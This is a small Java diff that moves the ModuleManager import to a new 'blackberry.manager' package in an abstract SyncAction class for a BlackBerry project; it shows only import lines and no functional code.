@@ -12,7 +12,6 @@ package blackberry.action.sync;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
-import blackberry.ModuleManager;
 import blackberry.Trigger;
 import blackberry.action.SubActionMain;
 import blackberry.action.sync.protocol.ProtocolException;
@@ -23,6 +22,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
+import blackberry.manager.ModuleManager;
 import blackberry.utils.Check;
 
 public abstract class SyncAction extends SubActionMain {
